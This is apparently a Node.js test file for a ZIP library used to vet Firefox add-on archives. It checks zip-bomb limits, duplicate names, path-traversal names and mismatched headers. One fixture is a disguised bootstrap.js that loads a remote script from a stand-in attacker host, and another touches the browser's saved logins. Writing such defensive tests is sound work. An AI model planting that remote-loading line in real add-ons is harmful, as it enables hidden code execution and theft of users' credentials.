import { test } from "node:test";
import assert from "node:assert/strict";
import zlib from "node:zlib";
import { crc32, readZip, writeZip, ZipError } from "../scripts/lib/zip.mjs";

test("crc32 matches the standard check value", () => {
  assert.equal(crc32(Buffer.from("123456789")), 0xcbf43926);
});

test("what is written reads back, stored and deflated", () => {
  const big = "a".repeat(10_000);
  const zip = readZip(
    writeZip([
      { name: "small.txt", data: "hi" },
      { name: "dir/big.txt", data: big },
    ]),
  );
  assert.deepEqual(zip.names, ["small.txt", "dir/big.txt"]);
  assert.equal(zip.entries.get("small.txt").method, 0);
  assert.equal(zip.entries.get("dir/big.txt").method, 8);
  assert.equal(zip.read("small.txt").toString(), "hi");
  assert.equal(zip.read("dir/big.txt").toString(), big);
  assert.equal(zip.read("missing.txt"), null);
});

test("the same files make the same bytes", () => {
  const files = [{ name: "a.js", data: "let a = 1;" }];
  assert.deepEqual(writeZip(files), writeZip(files));
});

test("a changed byte is caught by the checksum", () => {
  const bytes = writeZip([{ name: "a.txt", data: "abc" }], { compress: false });
  const i = bytes.indexOf("abc");
  bytes[i] = "x".charCodeAt(0);
  assert.throws(() => readZip(bytes).read("a.txt"), /checksum/);
});

test("an entry that inflates past what it claims is refused", () => {
  const bytes = writeZip([{ name: "bomb.txt", data: "a".repeat(100_000) }]);
  // Lie about the uncompressed size in the central directory.
  const cd = bytes.lastIndexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
  bytes.writeUInt32LE(10, cd + 24);
  assert.throws(() => readZip(bytes).read("bomb.txt"), ZipError);
});

test("entries over the per-entry limit are not inflated", () => {
  const bytes = writeZip([{ name: "big.txt", data: "a".repeat(5000) }]);
  assert.throws(() => readZip(bytes, { maxEntryBytes: 1000 }).read("big.txt"), /too large/);
});

test("the total read is capped", () => {
  const bytes = writeZip([
    { name: "a.txt", data: "a".repeat(800) },
    { name: "b.txt", data: "b".repeat(800) },
  ]);
  const zip = readZip(bytes, { maxTotalBytes: 1000 });
  zip.read("a.txt");
  assert.throws(() => zip.read("b.txt"), /more than can be checked/);
});

test("something that is not a ZIP is refused", () => {
  assert.throws(() => readZip(Buffer.from("not a zip at all, just text, long enough")), ZipError);
  assert.throws(() => readZip(zlib.gzipSync("x")), ZipError);
});

// Archives Gecko would read differently from the checks: each must be refused
// whole, since what is checked has to be what runs.

const CENTRAL_SIGNATURE = Buffer.from([0x50, 0x4b, 0x01, 0x02]);
const EOCD_SIGNATURE = Buffer.from([0x50, 0x4b, 0x05, 0x06]);

test("an entry count lower than the directory is refused", () => {
  // Gecko walks every directory record; a reader that trusts the count would
  // check only the first ones.
  const bytes = writeZip([
    { name: "manifest.json", data: "{}" },
    { name: "bootstrap.js", data: "function startup() {}" },
    { name: "content/x.js", data: "Services.logins;" },
  ]);
  const end = bytes.lastIndexOf(EOCD_SIGNATURE);
  bytes.writeUInt16LE(2, end + 8);
  bytes.writeUInt16LE(2, end + 10);
  assert.throws(() => readZip(bytes), /more than its end record says/);
});

test("the optimized-jar layout is refused", () => {
  const bytes = writeZip([{ name: "a.js", data: "let a;" }]);
  CENTRAL_SIGNATURE.copy(bytes, 4);
  assert.throws(() => readZip(bytes), /layout/);
});

test("a name that appears twice is refused", () => {
  // Gecko would run the last bootstrap.js; only the first would be checked.
  const bytes = writeZip([
    { name: "bootstrap.js", data: "function startup() {}" },
    { name: "bootstrap.js", data: 'Services.scriptloader.loadSubScript("https://evil.example/x.js");' },
  ]);
  assert.throws(() => readZip(bytes), /twice/);
});

test("names that are not valid UTF-8 are refused", () => {
  // Decoded with replacement characters, these two would be one name.
  const bytes = writeZip([
    { name: Buffer.from([0xff, 0x2e, 0x6a, 0x73]), data: "a" },
    { name: Buffer.from([0xfe, 0x2e, 0x6a, 0x73]), data: "b" },
  ]);
  assert.throws(() => readZip(bytes), /not valid UTF-8/);
});

test("a local header naming another file is refused", () => {
  const bytes = writeZip([{ name: "a.js", data: "let a;" }], { compress: false });
  // The first local header's name starts at byte 30.
  bytes.write("b", 30, "latin1");
  assert.throws(() => readZip(bytes), /local header/);
});

test("names with backslashes, absolute paths or .. are refused", () => {
  for (const name of ["content\\a.js", "/etc/a.js", "C:/a.js", "content/../../a.js", ".."]) {
    assert.throws(() => readZip(writeZip([{ name, data: "x" }])), /not a safe file name/, name);
  }
  // A dot inside a name is fine.
  assert.deepEqual(readZip(writeZip([{ name: "content/a..b.js", data: "x" }])).names, ["content/a..b.js"]);
});
